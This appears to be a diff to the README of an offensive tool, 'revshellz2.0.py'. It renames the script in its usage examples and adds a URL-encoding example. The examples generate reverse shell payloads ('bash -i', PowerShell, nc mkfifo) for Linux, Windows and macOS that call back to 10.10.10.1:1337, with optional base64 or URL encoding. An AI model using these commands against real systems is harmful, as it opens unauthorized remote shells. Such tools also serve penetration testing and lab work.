@@ -61,17 +61,21 @@ python3 revshellz2.0.py -l linux, windows, macos
 
 Generating reverse shell for Linux
 ```
-python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux
+python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux
 ```
 Generating reverse shell for Windows
 ```
-python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'PowerShell #1' -os windows
+python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'PowerShell #1' -os windows
 ```
 Generating reverse shell for MacOS
 ```
-python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'nc mkfifo' -os macos
+python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'nc mkfifo' -os macos
 ```
 Generating reverse shell with Base64 Encoding
 ```
-python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux -enc base64
+python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux -enc base64
+```
+Generating reverse shell with URL Encoding
+```
+python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux -enc url
 ```
